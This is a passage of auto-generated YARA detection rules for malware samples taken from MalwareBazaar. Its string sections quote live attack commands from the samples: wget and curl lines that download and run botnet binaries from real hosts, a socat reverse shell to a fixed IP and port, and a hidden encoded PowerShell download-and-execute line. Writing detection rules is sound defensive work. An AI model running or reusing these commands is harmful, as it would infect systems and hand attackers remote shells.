      $s8 = "{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x0" ascii
      $s9 = "/cgi-bin/index2.asp" fullword ascii
      $s10 = "/cgi-bin/?ogin.asp" fullword ascii
      $s11 = "t{|}f&~gq{&fdt{|}f9&d&oggodm&kget{|}f:&d&oggodm&kget{|}f;&d&oggodm&kget{|}f<&d&oggodm&kget{|}f&~gax{|}f|&kget{|}f&{axfm|&fm|" fullword ascii
      $s12 = "o?head-?ebs" fullword ascii
      $s13 = "sellanguage" fullword ascii
      $s14 = "labusrname" fullword ascii
      $s15 = "?ages/?ogin.htm" fullword ascii
      $s16 = "doc/script" fullword ascii
      $s17 = "IsRemote=1" fullword ascii
      $s18 = "{ \"Ret\" : 100, \"SessionID\" : \"0x0\" }" fullword ascii
      $s19 = "?ogin.rsp" fullword ascii
      $s20 = "/cgi-bin/main-cgi" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule sig_2328542fbda43d45a53e5cf3a5df03699609f591590012fc4240a1be00d608a9 {
   meta:
      description = "evidences - file 2328542fbda43d45a53e5cf3a5df03699609f591590012fc4240a1be00d608a9.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "2328542fbda43d45a53e5cf3a5df03699609f591590012fc4240a1be00d608a9"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x2 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x3 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s4 = "ReachFramework.resources.dll" fullword wide
      $s5 = "Update.dll" fullword ascii
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "get_loader_name_from_dll" fullword ascii
      $s8 = "4C4}INSTALLFOLDERl4dPleasePleasePleaseProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProc" ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "process_config_directive" fullword ascii
      $s12 = "qgethostname" fullword ascii
      $s13 = "get_loader_name" fullword ascii
      $s14 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s15 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s16 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s17 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s18 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "qregexec" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule a70cc08523e57daeb3beb725eef1e9d3eff6bc5e926b2f327295737055b7541e {
   meta:
      description = "evidences - file a70cc08523e57daeb3beb725eef1e9d3eff6bc5e926b2f327295737055b7541e.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "a70cc08523e57daeb3beb725eef1e9d3eff6bc5e926b2f327295737055b7541e"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x2 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x3 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s4 = "ReachFramework.resources.dll" fullword wide
      $s5 = "Update.dll" fullword ascii
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "get_loader_name_from_dll" fullword ascii
      $s8 = "4C4}INSTALLFOLDERl4dPleasePleasePleaseProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProc" ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "process_config_directive" fullword ascii
      $s12 = "qgethostname" fullword ascii
      $s13 = "get_loader_name" fullword ascii
      $s14 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s15 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s16 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s17 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s18 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "qregexec" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_15c41b2fea18b2df8a0bd09d84938a32d5d0b5e04576481108e649e43bf33f90 {
   meta:
      description = "evidences - file 15c41b2fea18b2df8a0bd09d84938a32d5d0b5e04576481108e649e43bf33f90.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "15c41b2fea18b2df8a0bd09d84938a32d5d0b5e04576481108e649e43bf33f90"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;rm bins.sh;wget http://146.19.162.73/bins.sh;curl -O http://146.19.162.73/" ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;rm bins.sh;wget http://146.19.162.73/bins.sh;curl -O http://146.19.162.73/" ascii
      $s3 = "bins.sh;/bin/busybox wget http://146.19.162.73/bins.sh; chmod 777 bins.sh;./bins.sh" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule sig_183f2419357b3a35b936d5fb2f5b38381fa5ad0612742e42541b8a0dde651e60 {
   meta:
      description = "evidences - file 183f2419357b3a35b936d5fb2f5b38381fa5ad0612742e42541b8a0dde651e60.xlsx"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "183f2419357b3a35b936d5fb2f5b38381fa5ad0612742e42541b8a0dde651e60"
   strings:
      $s1 = "customXml/itemProps1.xml " fullword ascii
      $s2 = "customXml/itemProps3.xml " fullword ascii
      $s3 = "customXml/itemProps2.xml " fullword ascii
      $s4 = "customXml/itemProps2.xmlPK" fullword ascii
      $s5 = "customXml/itemProps1.xmlPK" fullword ascii
      $s6 = "customXml/itemProps3.xmlPK" fullword ascii
      $s7 = "xl/printerSettings/printerSettings1.bin" fullword ascii
      $s8 = "xl/sharedStrings.xml" fullword ascii
      $s9 = "customXml/item2.xml " fullword ascii
      $s10 = "xl/printerSettings/printerSettings1.binPK" fullword ascii
      $s11 = "xl/worksheets/_rels/sheet1.xml.rels" fullword ascii
      $s12 = "customXml/item3.xml " fullword ascii
      $s13 = "customXml/_rels/item3.xml.relsPK" fullword ascii
      $s14 = "customXml/_rels/item1.xml.rels " fullword ascii
      $s15 = "docProps/custom.xml " fullword ascii
      $s16 = "xl/worksheets/_rels/sheet1.xml.relsPK" fullword ascii
      $s17 = "customXml/_rels/item2.xml.relsPK" fullword ascii
      $s18 = "docMetadata/LabelInfo.xml" fullword ascii
      $s19 = "xl/sharedStrings.xmlPK" fullword ascii
      $s20 = "customXml/_rels/item1.xml.relsPK" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 80KB and
      8 of them
}

rule sig_2891b33ae2cfd18482dac39858fcd82928231b013894877fbc8eef959e65eb6d {
   meta:
      description = "evidences - file 2891b33ae2cfd18482dac39858fcd82928231b013894877fbc8eef959e65eb6d.xlsx"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "2891b33ae2cfd18482dac39858fcd82928231b013894877fbc8eef959e65eb6d"
   strings:
      $s1 = "xl/sharedStrings.xmlPK" fullword ascii
      $s2 = "xl/sharedStrings.xmll" fullword ascii
      $s3 = "r:\"y_dl" fullword ascii
      $s4 = "xl/calcChain.xml<" fullword ascii
      $s5 = "xl/worksheets/sheet1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s6 = "xl/_rels/workbook.xml.relsPK" fullword ascii /* Goodware String - occured 3 times */
      $s7 = "xl/workbook.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s8 = "xl/theme/theme1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s9 = "xl/styles.xml" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "xl/worksheets/sheet1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s11 = "xl/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s12 = "xl/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s13 = "xl/_rels/workbook.xml.rels " fullword ascii /* Goodware String - occured 3 times */
      $s14 = "xl/workbook.xml" fullword ascii /* Goodware String - occured 3 times */
      $s15 = ":FzX7Q" fullword ascii
      $s16 = ">2q}!!" fullword ascii
      $s17 = ",ABk2Z[" fullword ascii
      $s18 = "Ay>VqJ" fullword ascii
      $s19 = "PbV%m.|[|Gh@" fullword ascii
      $s20 = "bP{}2!#" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 30KB and
      8 of them
}

rule f76ae809d4692f0a92a0ea5b83284e4b230f7241895870caac93aad3465c9288 {
   meta:
      description = "evidences - file f76ae809d4692f0a92a0ea5b83284e4b230f7241895870caac93aad3465c9288.xlsm"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "f76ae809d4692f0a92a0ea5b83284e4b230f7241895870caac93aad3465c9288"
   strings:
      $s1 = "customXml/itemProps3.xml" fullword ascii
      $s2 = "customXml/itemProps2.xml" fullword ascii
      $s3 = "customXml/itemProps2.xmlPK" fullword ascii
      $s4 = "customXml/itemProps1.xmlPK" fullword ascii
      $s5 = "customXml/itemProps3.xmlPK" fullword ascii
      $s6 = "customXml/itemProps1.xmld" fullword ascii
      $s7 = "xl/printerSettings/printerSettings1.bin" fullword ascii
      $s8 = "xl/sharedStrings.xml" fullword ascii
      $s9 = "xl/vbaProject.bin" fullword ascii
      $s10 = "customXml/item2.xml " fullword ascii
      $s11 = "xl/printerSettings/printerSettings1.binPK" fullword ascii
      $s12 = "xl/worksheets/_rels/sheet1.xml.rels" fullword ascii
      $s13 = "customXml/_rels/item3.xml.relsPK" fullword ascii
      $s14 = "customXml/_rels/item1.xml.rels " fullword ascii
      $s15 = "docProps/custom.xml " fullword ascii
      $s16 = "xl/worksheets/_rels/sheet1.xml.relsPK" fullword ascii
      $s17 = "customXml/_rels/item2.xml.relsPK" fullword ascii
      $s18 = "xl/sharedStrings.xmlPK" fullword ascii
      $s19 = "customXml/_rels/item1.xml.relsPK" fullword ascii
      $s20 = "customXml/_rels/item2.xml.rels " fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 500KB and
      8 of them
}

rule sig_2729c2bb3d044ef1b7c9d0298af54759b940169843046583c0ffc79f0a44d58c {
   meta:
      description = "evidences - file 2729c2bb3d044ef1b7c9d0298af54759b940169843046583c0ffc79f0a44d58c.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "2729c2bb3d044ef1b7c9d0298af54759b940169843046583c0ffc79f0a44d58c"
   strings:
      $s1 = "wget http://fbi.eye-network.ru/vevhea4; chmod 777 vevhea4; ./vevhea4 samsung-router" fullword ascii
      $s2 = "wget http://fbi.eye-network.ru/woega6; chmod 777 woega6; ./woega6 samsung-router" fullword ascii
      $s3 = "wget http://fbi.eye-network.ru/ngwa5; chmod 777 ngwa5; ./ngwa5 samsung-router" fullword ascii
      $s4 = "wget http://fbi.eye-network.ru/wev86; chmod 777 wev86; ./wev86 samsung-router" fullword ascii
      $s5 = "wget http://fbi.eye-network.ru/ivwebcda7; chmod 777 ivwebcda7; ./ivwebcda7 samsung-router" fullword ascii
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule sig_339e3b0b70f9bd3bae40ccbfd4804734bef3042c37a9fb95fc549066955ec622 {
   meta:
      description = "evidences - file 339e3b0b70f9bd3bae40ccbfd4804734bef3042c37a9fb95fc549066955ec622.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "339e3b0b70f9bd3bae40ccbfd4804734bef3042c37a9fb95fc549066955ec622"
   strings:
      $s1 = "wget http://217.28.130.78/.a/busybox -O- > busybox" fullword ascii
      $s2 = "wget http://217.28.130.78/.a/gdb -O- > gdb" fullword ascii
      $s3 = "wget http://217.28.130.78/.a/strace -O- > strace" fullword ascii
      $s4 = "wget http://217.28.130.78/.a/socat -O- > socat" fullword ascii
      $s5 = "./socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:217.28.130.78:4444" fullword ascii
      $s6 = "cd /tmp" fullword ascii
      $s7 = "chmod 777 *" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule e52a25d67485856dbd9605ef38f14adaf0da32cf8cecf1537990c2e88679ecd2 {
   meta:
      description = "evidences - file e52a25d67485856dbd9605ef38f14adaf0da32cf8cecf1537990c2e88679ecd2.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "e52a25d67485856dbd9605ef38f14adaf0da32cf8cecf1537990c2e88679ecd2"
   strings:
      $s1 = "wget http://217.28.130.78/.a/busybox -O- > busybox" fullword ascii
      $s2 = "wget http://217.28.130.78/.a/gdb -O- > gdb" fullword ascii
      $s3 = "wget http://217.28.130.78/.a/strace -O- > strace" fullword ascii
      $s4 = "wget http://217.28.130.78/.a/socat -O- > socat" fullword ascii
      $s5 = "./socat exec:'sh -i',pty,stderr,setsid,sigint,sane tcp:217.28.130.78:4444" fullword ascii
      $s6 = "cd /tmp" fullword ascii
      $s7 = "chmod +x *" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule sig_37fabfdbe721b17601f7efa9059bf2c2cf71bb0689c1d5e6a4672fedd6f1e227 {
   meta:
      description = "evidences - file 37fabfdbe721b17601f7efa9059bf2c2cf71bb0689c1d5e6a4672fedd6f1e227.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "37fabfdbe721b17601f7efa9059bf2c2cf71bb0689c1d5e6a4672fedd6f1e227"
   strings:
      $s1 = "Invoice for AWB charges.exe" fullword ascii
      $s2 = "olbtbcr" fullword ascii
      $s3 = "710irc3/" fullword ascii
      $s4 = "g.B7!." fullword ascii
      $s5 = "I&3* t" fullword ascii
      $s6 = "Lyipsk0" fullword ascii
      $s7 = "/!4+ u17" fullword ascii
      $s8 = "NMYlIJs" fullword ascii
      $s9 = "OWPvUT2$VPw" fullword ascii
      $s10 = "rOnKoc)C" fullword ascii
      $s11 = "GpYw'[yyH" fullword ascii
      $s12 = "H3\\nalH/3P" fullword ascii
      $s13 = "fDLhX(*Q" fullword ascii
      $s14 = "Yjeg.$l/" fullword ascii
      $s15 = "pCpU\"$" fullword ascii
      $s16 = "JkTEo[U" fullword ascii
      $s17 = "MGXZ^WP_6" fullword ascii
      $s18 = "LItXFS\"" fullword ascii
      $s19 = "VFba;ltv" fullword ascii
      $s20 = "OGJeC\\" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule sig_3d0ecb3153b2807c930f820ddf5406d2e040a1a3553abc7dadcd7b7a608ee551 {
   meta:
      description = "evidences - file 3d0ecb3153b2807c930f820ddf5406d2e040a1a3553abc7dadcd7b7a608ee551.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "3d0ecb3153b2807c930f820ddf5406d2e040a1a3553abc7dadcd7b7a608ee551"
   strings:
      $s1 = "scasssss,,.exe" fullword ascii
      $s2 = "olbtbcr" fullword ascii
      $s3 = "vjrHrJo* " fullword ascii
      $s4 = "g.B7!." fullword ascii
      $s5 = "/!4+ u17" fullword ascii
      $s6 = "q* _{>ln" fullword ascii
      $s7 = "q%W%HR#r" fullword ascii
      $s8 = "+ vh05pA" fullword ascii
      $s9 = "OWPvUT2$VPw" fullword ascii
      $s10 = "rOnKoc)C" fullword ascii
      $s11 = "H3\\nalH/3P" fullword ascii
      $s12 = "fDLhX(*Q" fullword ascii
      $s13 = "Yjeg.$l/" fullword ascii
      $s14 = "pCpU\"$" fullword ascii
      $s15 = "MGXZ^WP_6" fullword ascii
      $s16 = "LItXFS\"" fullword ascii
      $s17 = "OGJeC\\" fullword ascii
      $s18 = "EKmSC*t" fullword ascii
      $s19 = "NsXe`l9" fullword ascii
      $s20 = "CdBn\"q5" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      8 of them
}

rule sig_72312625fba0c0237c06eb131c554376df142b4ef0bb514f47e1655b6064948d {
   meta:
      description = "evidences - file 72312625fba0c0237c06eb131c554376df142b4ef0bb514f47e1655b6064948d.r00"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "72312625fba0c0237c06eb131c554376df142b4ef0bb514f47e1655b6064948d"
   strings:
      $s1 = "sgooojg.exe" fullword ascii
      $s2 = "eyEm1BQ" fullword ascii
      $s3 = "olbtbcr" fullword ascii
      $s4 = "g.B7!." fullword ascii
      $s5 = "/!4+ u17" fullword ascii
      $s6 = "ios?* " fullword ascii
      $s7 = "(|!* %1#U" fullword ascii
      $s8 = "OWPvUT2$VPw" fullword ascii
      $s9 = "rOnKoc)C" fullword ascii
      $s10 = "H3\\nalH/3P" fullword ascii
      $s11 = "fDLhX(*Q" fullword ascii
      $s12 = "Yjeg.$l/" fullword ascii
      $s13 = "pCpU\"$" fullword ascii
      $s14 = "MGXZ^WP_6" fullword ascii
      $s15 = "LItXFS\"" fullword ascii
      $s16 = "OGJeC\\" fullword ascii
      $s17 = "EKmSC*t" fullword ascii
      $s18 = "NsXe`l9" fullword ascii
      $s19 = "CdBn\"q5" fullword ascii
      $s20 = "AXsA#+j" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      8 of them
}

rule a462535dd4c7d80f9b474eb2a67117563a9fcc8d73fc0592b7753fdf4191f758 {
   meta:
      description = "evidences - file a462535dd4c7d80f9b474eb2a67117563a9fcc8d73fc0592b7753fdf4191f758.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "a462535dd4c7d80f9b474eb2a67117563a9fcc8d73fc0592b7753fdf4191f758"
   strings:
      $s1 = "DREADDD.exe" fullword ascii
      $s2 = "olbtbcr" fullword ascii
      $s3 = "g.B7!." fullword ascii
      $s4 = "/!4+ u17" fullword ascii
      $s5 = "# R2^0" fullword ascii
      $s6 = "OWPvUT2$VPw" fullword ascii
      $s7 = "rOnKoc)C" fullword ascii
      $s8 = "H3\\nalH/3P" fullword ascii
      $s9 = "fDLhX(*Q" fullword ascii
      $s10 = "Yjeg.$l/" fullword ascii
      $s11 = "pCpU\"$" fullword ascii
      $s12 = "MGXZ^WP_6" fullword ascii
      $s13 = "LItXFS\"" fullword ascii
      $s14 = "OGJeC\\" fullword ascii
      $s15 = "EKmSC*t" fullword ascii
      $s16 = "NsXe`l9" fullword ascii
      $s17 = "CdBn\"q5" fullword ascii
      $s18 = "AXsA#+j" fullword ascii
      $s19 = "}7VhCGsDDg" fullword ascii
      $s20 = "OrYr-42c" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      8 of them
}

rule ac9668e3d4b15124dca0754cbcb471f3fe21ec7c86bbe7b004e155cf175c6400 {
   meta:
      description = "evidences - file ac9668e3d4b15124dca0754cbcb471f3fe21ec7c86bbe7b004e155cf175c6400.r00"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "ac9668e3d4b15124dca0754cbcb471f3fe21ec7c86bbe7b004e155cf175c6400"
   strings:
      $s1 = "aaaaaaaaaaaaaaaaaa.exe" fullword ascii
      $s2 = "olbtbcr" fullword ascii
      $s3 = "g.B7!." fullword ascii
      $s4 = "/!4+ u17" fullword ascii
      $s5 = "q%W%HR#r" fullword ascii
      $s6 = "umeQjo6" fullword ascii
      $s7 = "0&+ $H- ;3 " fullword ascii
      $s8 = "OWPvUT2$VPw" fullword ascii
      $s9 = "rOnKoc)C" fullword ascii
      $s10 = "H3\\nalH/3P" fullword ascii
      $s11 = "fDLhX(*Q" fullword ascii
      $s12 = "Yjeg.$l/" fullword ascii
      $s13 = "pCpU\"$" fullword ascii
      $s14 = "MGXZ^WP_6" fullword ascii
      $s15 = "LItXFS\"" fullword ascii
      $s16 = "OGJeC\\" fullword ascii
      $s17 = "EKmSC*t" fullword ascii
      $s18 = "NsXe`l9" fullword ascii
      $s19 = "CdBn\"q5" fullword ascii
      $s20 = "AXsA#+j" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      8 of them
}

rule b9b8fac8f063817cc343683f71e60414dc961f1c1d2b4b421772b6fd373b082d {
   meta:
      description = "evidences - file b9b8fac8f063817cc343683f71e60414dc961f1c1d2b4b421772b6fd373b082d.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "b9b8fac8f063817cc343683f71e60414dc961f1c1d2b4b421772b6fd373b082d"
   strings:
      $s1 = "SHIPPP.exe" fullword ascii
      $s2 = "olbtbcr" fullword ascii
      $s3 = "nHi:\\E" fullword ascii
      $s4 = "GUjB:\"" fullword ascii
      $s5 = "g.B7!." fullword ascii
      $s6 = "/!4+ u17" fullword ascii
      $s7 = "*mK* _" fullword ascii
      $s8 = "ltpnjx" fullword ascii
      $s9 = "OWPvUT2$VPw" fullword ascii
      $s10 = "rOnKoc)C" fullword ascii
      $s11 = "H3\\nalH/3P" fullword ascii
      $s12 = "fDLhX(*Q" fullword ascii
      $s13 = "Yjeg.$l/" fullword ascii
      $s14 = "pCpU\"$" fullword ascii
      $s15 = "MGXZ^WP_6" fullword ascii
      $s16 = "LItXFS\"" fullword ascii
      $s17 = "OGJeC\\" fullword ascii
      $s18 = "EKmSC*t" fullword ascii
      $s19 = "NsXe`l9" fullword ascii
      $s20 = "CdBn\"q5" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      8 of them
}

rule dc758276ceeacab79a2a2959453c15c5ed7567186cd09a2958204efa2d371de4 {
   meta:
      description = "evidences - file dc758276ceeacab79a2a2959453c15c5ed7567186cd09a2958204efa2d371de4.r00"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "dc758276ceeacab79a2a2959453c15c5ed7567186cd09a2958204efa2d371de4"
   strings:
      $s1 = "sggii.exe" fullword ascii
      $s2 = "olbtbcr" fullword ascii
      $s3 = "Ccnusen" fullword ascii
      $s4 = "g.B7!." fullword ascii
      $s5 = "/!4+ u17" fullword ascii
      $s6 = "q%W%HR#r" fullword ascii
      $s7 = "( -R*%" fullword ascii
      $s8 = "YV<) -" fullword ascii
      $s9 = "OWPvUT2$VPw" fullword ascii
      $s10 = "rOnKoc)C" fullword ascii
      $s11 = "H3\\nalH/3P" fullword ascii
      $s12 = "fDLhX(*Q" fullword ascii
      $s13 = "Yjeg.$l/" fullword ascii
      $s14 = "pCpU\"$" fullword ascii
      $s15 = "MGXZ^WP_6" fullword ascii
      $s16 = "LItXFS\"" fullword ascii
      $s17 = "OGJeC\\" fullword ascii
      $s18 = "EKmSC*t" fullword ascii
      $s19 = "NsXe`l9" fullword ascii
      $s20 = "CdBn\"q5" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      8 of them
}

rule sig_51ad140d7fda02b6350d69a6835e79a45ba21339675818ec00979f84db795247 {
   meta:
      description = "evidences - file 51ad140d7fda02b6350d69a6835e79a45ba21339675818ec00979f84db795247.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "51ad140d7fda02b6350d69a6835e79a45ba21339675818ec00979f84db795247"
   strings:
      $s1 = "busybox wget http://nouuu.eye-network.ru/fqkjei686; chmod 777 fqkjei686; ./fqkjei686 telnet" fullword ascii
      $s2 = "busybox wget http://nouuu.eye-network.ru/wrjkngh4; chmod 777 wrjkngh4; ./wrjkngh4 telnet" fullword ascii
      $s3 = "busybox wget http://nouuu.eye-network.ru/ivwebcda7; chmod 777 ivwebcda7; ./ivwebcda7 telnet" fullword ascii
      $s4 = "busybox wget http://nouuu.eye-network.ru/gnjqwpc; chmod 777 gnjqwpc; ./gnjqwpc telnet" fullword ascii
      $s5 = "busybox wget http://nouuu.eye-network.ru/vevhea4; chmod 777 vevhea4; ./vevhea4 telnet" fullword ascii
      $s6 = "busybox wget http://nouuu.eye-network.ru/qbfwdbg; chmod 777 qbfwdbg; ./qbfwdbg telnet" fullword ascii
      $s7 = "busybox wget http://nouuu.eye-network.ru/fbhervbhsl; chmod 777 fbhervbhsl; ./fbhervbhsl telnet" fullword ascii
      $s8 = "busybox wget http://nouuu.eye-network.ru/woega6; chmod 777 woega6; ./woega6 telnet" fullword ascii
      $s9 = "busybox wget http://nouuu.eye-network.ru/wev86; chmod 777 wev86; ./wev86 telnet" fullword ascii
      $s10 = "busybox wget http://nouuu.eye-network.ru/jefne64; chmod 777 jefne64; ./jefne64 telnet" fullword ascii
      $s11 = "busybox wget http://nouuu.eye-network.ru/ngwa5; chmod 777 ngwa5; ./ngwa5 telnet" fullword ascii
      $s12 = "busybox wget http://nouuu.eye-network.ru/debvps; chmod 777 debvps; ./debvps telnet" fullword ascii
      $s13 = "busybox wget http://nouuu.eye-network.ru/wlw68k; chmod 777 wlw68k; ./wlw68k telnet" fullword ascii
   condition:
      uint16(0) == 0x7562 and filesize < 3KB and
      8 of them
}

rule sig_5605af6e3cba4057057a8cc765f94d1112d1a147171e056b1bdfcc3b38a056f0 {
   meta:
      description = "evidences - file 5605af6e3cba4057057a8cc765f94d1112d1a147171e056b1bdfcc3b38a056f0.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "5605af6e3cba4057057a8cc765f94d1112d1a147171e056b1bdfcc3b38a056f0"
   strings:
      $s1 = "powershell -WindowStyle Hidden -enc aQB3AHIAIAAtAHUAcwBlAGIAIABoAHQAdABwADoALwAvADEAOAA1AC4AMQA0ADkALgAxADQANgAuADEANgA0AC8AdwBy" ascii
      $s2 = "powershell -WindowStyle Hidden -enc aQB3AHIAIAAtAHUAcwBlAGIAIABoAHQAdABwADoALwAvADEAOAA1AC4AMQA0ADkALgAxADQANgAuADEANgA0AC8AdwBy" ascii
      $s3 = "AGMAYQBmAC4AcABzADEAIAB8ACAAaQBlAHgA" fullword ascii /* base64 encoded string ' c a f . p s 1   |   i e x ' */
   condition:
      uint16(0) == 0x6f70 and filesize < 1KB and
      all of them
}

rule sig_5929cd8f4b4be8bc6b9cbfa07a53f04a0b17290efbd6db1f982307718d6f698f {
   meta:
      description = "evidences - file 5929cd8f4b4be8bc6b9cbfa07a53f04a0b17290efbd6db1f982307718d6f698f.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "5929cd8f4b4be8bc6b9cbfa07a53f04a0b17290efbd6db1f982307718d6f698f"
   strings:
      $s1 = "WWWWWUP" fullword ascii
      $s2 = "XkJvz.i" fullword ascii
      $s3 = "t#9t" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "S@_^][" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "hQdi1!m" fullword ascii
      $s6 = "SVWj<_3" fullword ascii
      $s7 = "UVSVVV" fullword ascii
      $s8 = "V@_^][" fullword ascii /* Goodware String - occured 2 times */
      $s9 = "D$ tpj@" fullword ascii
      $s10 = "{'%}&Yb9:" fullword ascii
      $s11 = "?5SzkW" fullword ascii
